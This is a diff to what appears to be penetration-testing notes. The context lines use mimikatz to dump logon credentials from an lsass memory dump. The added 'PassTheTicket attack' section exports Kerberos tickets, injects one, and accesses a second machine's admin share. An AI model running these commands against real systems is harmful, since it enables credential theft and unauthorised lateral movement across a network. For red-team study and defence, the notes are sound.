@@ -56,8 +56,22 @@ mimikatz # sekurlsa::minidump lsass.dmp
 # Opening : 'lsass.dmp' file for minidump...
 mimikatz # sekurlsa::logonpasswords
 ###########
+
 ```
 
+
+## PassTheTicket attack
+
+```
+# Export the tickets existing in machine1 so they can be used 
+sekurlsa::tickets /export
+
+# That will generate a lot of tickets. To pass the ticket to our context
+kerberos::ptt  {ticketname}
+
+# Now the ticket is loaded in our machine 1. We can now do a dir on machine2
+dir \\machine2\c$
+```
 
 ## An Example
 
